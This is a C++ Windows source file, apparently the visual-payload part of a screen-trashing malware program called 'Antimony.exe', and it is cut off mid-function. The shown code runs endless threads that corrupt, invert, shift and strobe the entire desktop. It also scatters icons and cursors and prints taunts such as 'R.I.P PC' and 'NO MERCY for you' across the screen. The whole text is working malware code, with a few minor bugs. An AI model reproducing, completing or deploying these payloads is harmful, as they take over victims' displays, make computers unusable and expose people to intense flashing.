#include <iostream>
#include <windows.h>
#include <windowsx.h>
#include <cmath>
#include <stdio.h>
#include <tchar.h>
#include <ShlObj.h>
#define RGBBRUSH (DWORD)0x1900ac010e
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE unused;
    };
} *PRGBQUAD;

typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;


namespace Colors
{
    //These HSL functions was made by Wipet, credits to him!

    HSL rgb2hsl(RGBQUAD rgb)
    {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f)
        {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl)
    {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f)
        {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant)
            {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}

POINT mkp(int x, int y) {
    POINT p;
    p.x = x;
    p.y = y;
    return p;
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

VOID WINAPI RotatePoints(POINT* points, int count, POINT center, float angle)
{
    float cosVal = cos(angle);
    float sinVal = sin(angle);
    for (int i = 0; i < count; i++)
    {
        int translatedX = points[i].x - center.x;
        int translatedY = points[i].y - center.y;
        points[i].x = static_cast<int>(translatedX * cosVal - translatedY * sinVal + center.x);
        points[i].y = static_cast<int>(translatedX * sinVal + translatedY * cosVal + center.y);
    }
}

DWORD WINAPI Sanjiaoxing(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    float rotationAngle = 0.0f;
    float rotationSpeed = 0.02f;
    while (1)
    {
        HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
        int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y;
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        POINT vertices[] =
        {
            {
                top_x, bottom_y
            },
            {
                bottom_x, bottom_y
            },
            {
                (top_x + bottom_x) / 2, top_y
            }
        };
        POINT center =
        {
            (top_x + bottom_x) / 2, (top_y + bottom_y) / 2
        };
        RotatePoints(vertices, sizeof(vertices) / sizeof(vertices[0]), center, rotationAngle);
        Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
            signY = -1;
        }
        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }
        if (y == 0)
        {
            signY = 1;
        }
        if (x == 0)
        {
            signX = 1;
        }
        rotationAngle += rotationSpeed;
        Sleep(1);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI DrawTexts(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    LPCSTR lpText = "Antimony.exe";
    int changdu = strlen(lpText);
    while (1) {
        x += incrementor * signX;
        y += incrementor * signY;
        int top_x = 0 + x;
        int top_y = 0 + y;
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFontA(70, 30, 0, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Microsoft YaHei");
        SelectObject(hdc, font);
        TextOutA(hdc, top_x, top_y, lpText, changdu);
        if (y >= GetSystemMetrics(SM_CYSCREEN) - 60)
        {
            signY = -1;
        }
        if (x >= GetSystemMetrics(SM_CXSCREEN) - 390)
        {
            signX = -1;
        }
        if (y == 0)
        {
            signY = 1;
        }
        if (x == 0)
        {
            signX = 1;
        }
        Sleep(10);
        DeleteObject(font);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI DrawTexts2(LPVOID lpParam) {
    srand(time(NULL));
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        SetBkMode(hcdc, 1);
        //If u want 2 know what does "NB" mean, Please click this link -> https://hinative.com/questions/21291771
        //hmm
        LPCSTR text[24] = { "XUGENB", "WinMalwareNB", "pankoza2NB", "kapi2.0peysNB", "JhoProNB", "ArTicZeraNB" , "hopejieshuoNB" , "wipetNB" , "Coder-LinjianNB" , "LeoNB" , "N17Pro3426NB", "GetMBRNB", "fr4ctalzNB", "CYBERSOLIDERNB" , "pray the god to save your computer..." , "Where are you going?" , "R.I.P PC" , "hopeless" , "goodbye...", "enjoy your new computer" , "Still using this computer?", "AMOG US", "Stop strugging and crying." , "NO MERCY for you." };
        int tmp = rand() % 24;
        SetTextColor(hcdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFontA(50, 30, 0, 0, FW_NORMAL, 0, 0, 0, ANSI_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "1145141919810");
        SelectObject(hcdc, font);
        TextOutA(hcdc, rand() % w, rand() % h, text[tmp], strlen(text[tmp]));
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(font);
        DeleteObject(hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        Sleep(20);
    }
}

DWORD WINAPI DrawCursors(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc;
    HICON shifang;
    while (true) {
        HICON shifang = LoadCursor(0, IDC_APPSTARTING);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, rand() % (w / 2), rand() % (h / 2), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(50);
        shifang = LoadCursor(0, IDC_ARROW);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, rand() % (w / 2), rand() % (h / 2), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(50);
        shifang = LoadCursor(0, IDC_CROSS);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, rand() % (w / 2), rand() % (h / 2), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(50);
        shifang = LoadCursor(0, IDC_HELP);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, rand() % (w / 2), rand() % (h / 2), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(50);
        shifang = LoadCursor(0, IDC_IBEAM);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, rand() % (w / 2), rand() % (h / 2), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(50);
        shifang = LoadCursor(0, IDC_NO);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, rand() % (w / 2), rand() % (h / 2), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(50);
        shifang = LoadCursor(0, IDC_SIZEALL);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, rand() % (w / 2), rand() % (h / 2), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(50);
        shifang = LoadCursor(0, IDC_SIZENESW);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, rand() % (w / 2), rand() % (h / 2), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(50);
        shifang = LoadCursor(0, IDC_SIZENS);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, rand() % (w / 2), rand() % (h / 2), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(50);
        shifang = LoadCursor(0, IDC_SIZENWSE);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, rand() % (w / 2), rand() % (h / 2), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(50);
        shifang = LoadCursor(0, IDC_SIZEWE);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, rand() % (w / 2), rand() % (h / 2), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(50);
        shifang = LoadCursor(0, IDC_UPARROW);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, rand() % (w / 2), rand() % (h / 2), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(50);
        shifang = LoadCursor(0, IDC_WAIT);
        hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, rand() % (w / 2), rand() % (h / 2), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(50);
    }
}

DWORD WINAPI DrawIcons(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    while (true) {
        HICON shifang = LoadIcon(NULL, MAKEINTRESOURCE(32512 + rand() % 4));
        HDC hdc = GetDC(0);
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, rand() % (w / 2), rand() % (h / 2), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        Sleep(50);
    }
}

VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, hBrush);
    Rectangle(hdc, x, y, w + x, h + y);
    ReleaseDC(NULL, hdc);
    DeleteObject(hrgn);
}

VOID WINAPI train(HDC hdc, int w, int h, int xPower, int yPower, DWORD dwRop) {
    if (xPower >= w) xPower = w - 1; if (yPower >= h) yPower = h - 1;
    HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
    HDC hdc2 = CreateCompatibleDC(hdc); 
    SelectObject(hdc2, screenshot);
    BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    BitBlt(hdc, xPower > 0 ? xPower : 0, yPower > 0 ? yPower : 0, w - abs(xPower), h - abs(yPower), hdc, xPower < 0 ? -xPower : 0, yPower < 0 ? -yPower : 0, dwRop);
    BitBlt(hdc, xPower < 0 ? w + xPower : 0, 0, abs(xPower), h, hdc2, xPower > 0 ? w - xPower : 0, 0, dwRop);
    BitBlt(hdc, 0, yPower < 0 ? h + yPower : 0, w, abs(yPower), hdc2, 0, yPower > 0 ? h - yPower : 0, dwRop);
    DeleteDC(hdc2); 
    DeleteObject(screenshot);
}

DWORD WINAPI Payload1_num1(LPVOID lpParam) {
    int move = 10;
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int go = 0;
    srand(time(NULL));
    while (true) {
        for (int y = 0; y < h; y++) {
            int sb = rand() % 50;
            if (sb > 25) {
                go = 1;
            }
            else {
                go = 0;
            }

            if (go == 1) {
                HDC hdc = GetDC(0);
                StretchBlt(hdc, -move, y, w, 1, hdc, 0, y, w, 1, SRCCOPY);
                ReleaseDC(NULL, hdc);
            }
            else {
                HDC hdc = GetDC(0);
                StretchBlt(hdc, move, y, w, 1, hdc, 0, y, w, 1, SRCCOPY);
                ReleaseDC(NULL, hdc);
            }
        }
        Sleep(100);
    }
}

DWORD WINAPI Payload1_num2(LPVOID lpParam) {
    int dabeita = 0;
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    srand(time(NULL));
    while (true) {
        for (int i = 0; i < 40; i++) {
            if (rand() % 100 > 90) {
                HDC hdc = GetDC(0);
                StretchBlt(hdc, 0, h, w, -h, hdc, 0, 0, w, h, SRCCOPY);
                ReleaseDC(NULL, hdc);
                hdc = GetDC(0);
                StretchBlt(hdc, 0, h, w, -h, hdc, w, h, -w, -h, SRCCOPY);
                ReleaseDC(NULL, hdc);
            }
            int y = rand() % 4;
            int sj1 = rand() % w;
            int sj2 = rand() % h;
            HDC hdc = GetDC(0);
            if (y == 1) {
                dabeita = rand() % 100;
                if (dabeita > 50) {
                    dabeita = rand() % 100;
                    if (dabeita > 50) {
                        StretchBlt(hdc, sj1 - 5, sj2, h, h, hdc, sj1, sj2, h, h, SRCPAINT);
                    }
                    else {
                        StretchBlt(hdc, sj1 - 5, sj2, h, h, hdc, sj1, sj2, h, h, SRCAND);
                    }
                }
                else {
                    StretchBlt(hdc, sj1 - 5, sj2, h, h, hdc, sj1, sj2, h, h, SRCCOPY);
                }
            }
            if (y == 2) {
                dabeita = rand() % 100;
                if (dabeita > 50) {
                    dabeita = rand() % 100;
                    if (dabeita > 50) {
                        StretchBlt(hdc, sj1 + 5, sj2, h, h, hdc, sj1, sj2, h, h, SRCPAINT);
                    }
                    else {
                        StretchBlt(hdc, sj1 + 5, sj2, h, h, hdc, sj1, sj2, h, h, SRCAND);
                    }
                }
                else {
                    StretchBlt(hdc, sj1 + 5, sj2, h, h, hdc, sj1, sj2, h, h, SRCCOPY);
                }
            }
            if (y == 3) {
                dabeita = rand() % 100;
                if (dabeita > 50) {
                    dabeita = rand() % 100;
                    if (dabeita > 50) {
                        StretchBlt(hdc, sj1, sj2 - 5, h, h, hdc, sj1, sj2, h, h, SRCPAINT);
                    }
                    else {
                        StretchBlt(hdc, sj1, sj2 - 5, h, h, hdc, sj1, sj2, h, h, SRCAND);
                    }
                }
                else {
                    StretchBlt(hdc, sj1, sj2 - 5, h, h, hdc, sj1, sj2, h, h, SRCCOPY);
                }
            }
            if (y == 4) {
                dabeita = rand() % 100;
                if (dabeita > 50) {
                    dabeita = rand() % 100;
                    if (dabeita > 50) {
                        StretchBlt(hdc, sj1, sj2 + 5, h, h, hdc, sj1, sj2, h, h, SRCPAINT);
                    }
                    else {
                        StretchBlt(hdc, sj1, sj2 + 5, h, h, hdc, sj1, sj2, h, h, SRCAND);
                    }
                }
                else {
                    StretchBlt(hdc, sj1, sj2 + 5, h, h, hdc, sj1, sj2, h, h, SRCCOPY);
                }
            }
            int rand_x = rand() % w;
            int rand_y = rand() % h;
            BitBlt(hdc, rand() % 5, rand() % 5, rand() % w, rand() % h, hdc, rand() % 5, rand() % 5, SRCCOPY);
            BitBlt(hdc, rand_x, rand_y, 200, 200, hdc, rand_x + rand() % 40 - 10, rand_y + rand() % 40 - 10, SRCCOPY);
            ReleaseDC(0, hdc);
        }
        Sleep(1);
    }
}

DWORD WINAPI Payload1_num3(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, 0, 0, w / 10, h, hcdc, w / 10 * 9, 0, SRCCOPY);
        BitBlt(hcdc, w / 10, 0, w / 10 * 9, h, hcdc, 0, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        Sleep(10);
    }
}

DWORD WINAPI Payload1_num4(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, hBrush);
        Rectangle(hdc, rand() % w, rand() % h, rand() % w, rand() % h);
        DeleteObject(hBrush);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI Payload2_num1(LPVOID lpParam) { //N17Pro3426
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    while (1) {
        for (int angle = 0; angle < 720; angle++) {
            int x = 100 * cos(angle * 3.1415926 / 180.F), y = 100 * sin(angle * 3.1415926 / 180.F);
            hdc = GetDC(0);
            train(hdc, w, h, x, y, SRCCOPY);
            ReleaseDC(0, hdc);
            Sleep(1);
        }
    }
}

DWORD WINAPI Payload2_num2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hcdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP hBitmap;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    hBitmap = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(hcdc, hBitmap);
    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;
    srand(time(NULL));
    while (1) {
        hdc = GetDC(NULL);
        HBRUSH hbr = CreateSolidBrush(Hue(rand() % 255));
        SelectObject(hcdc, hbr);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, PATCOPY);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        DeleteObject(hbr);
        ReleaseDC(0, hdc);
        Sleep(1);
    }
}

DWORD WINAPI Payload3_num1(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    BLENDFUNCTION blur;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = (x + i * 4) + (y + i * 4);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
                hslcolor.s = 0.7f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 65;
        AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI Payload4_num1(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + (i * 4) * cbrt(x ^ y));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
                hslcolor.s = 0.7f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 80;
        AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI Payload5_num1(LPVOID lpParam) {
    while (true)
    {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int sb = rand() % 5;
        if (sb == 0) {
            sb == 1;
        }

        if (sb == 1) {
            BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCERASE);
        }
        else if (sb == 2) {
            BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCINVERT);
        }
        else if (sb == 3) {
            BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCPAINT);
        }
        else if (sb == 4) {
            BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, NOTSRCERASE);
        }
        else if (sb == 5) {
            BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, NOTSRCCOPY);
        }
        ReleaseDC(0, hdc);
        Sleep(500);
    }
}

DWORD WINAPI Payload5_num2(LPVOID lpParam) {
    while (1)
    {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
        HDC hdcTemp = CreateCompatibleDC(hdc);
        HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
        BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int numShifts = 100 + rand() % 1045;
        for (int i = 0; i < numShifts; i++)
        {
            int x = rand() % w;
            int y = rand() % h;
            int dx = (rand() % 5) - 2;
            int dy = (rand() % 5) - 2;
            BitBlt(hdcTemp, x + dx, y + dy, w - dx, h - dy, hdcTemp, x, y, SRCCOPY);
        }
        if (rand() % 2 != 0) {
            BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCERASE);
        }
        else {
            BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCINVERT);
        }
        SelectObject(hdcTemp, hbmOld);
        DeleteDC(hdcTemp);
        DeleteObject(hbm);
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI Payload5_num3(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        hdc = GetDC(0);
        for (int angle = 0; angle < 361; angle++) {
            int x = 100 * tan(angle * 3.1415926 / 0.41), y = 100 * sin(angle * 3.1415926 / 0.50);
            BitBlt(hdc, x, y, sw, sh, hdc, 0, 0, NOTSRCERASE);
            Sleep(0.5);
        }
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI Payload6_num1(LPVOID lpParam) {
    INT w = GetSystemMetrics(0);
    INT h = GetSystemMetrics(1);
    srand(time(NULL));
    while (true)
    {
        int randx = rand() % w;
        int randw = (rand() % w / 4);
        HDC hdc = GetDC(0);
        StretchBlt(hdc, randx, -(rand() % 20), randw, h, hdc, randx, 0, randw, h, SRCCOPY);
        ReleaseDC(0, hdc);
        randx = rand() % w;
        randw = (rand() % w / 4);
        hdc = GetDC(0);
        HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, hBrush);
        StretchBlt(hdc, randx, -(rand() % 20), randw, h, hdc, randx, 0, randw, h, RGBBRUSH);
        ReleaseDC(0, hdc);
        DeleteObject(hBrush);
        Sleep(1);
    }
}

DWORD WINAPI Payload6_num2(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    double angle = 0;
    while (1) {
        hdc = GetDC(0);
        for (float i = 0; i < w + h; i += 0.99f) {
            int a = sin(angle) * 20;
            BitBlt(hdc, 0, i, w, 1, hdc, a, i, SRCCOPY);
            angle += 3.1415926 / 40;
            DeleteObject(&i); DeleteObject(&a);
        }
        for (float i = 0; i < w + h; i += 0.99f) {
            int a = sin(angle) * 20;
            BitBlt(hdc, i, 0, 1, h, hdc, i, a, SRCCOPY);
            angle += 3.1415926 / 40;
            DeleteObject(&a); DeleteObject(&i);
        }
        ReleaseDC(0, hdc);
        DeleteObject(&angle);
    }
    return 0;
}

DWORD WINAPI Payload7_num1(LPVOID lpParam) {
    int get = 1;
    int getmod = 1;
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
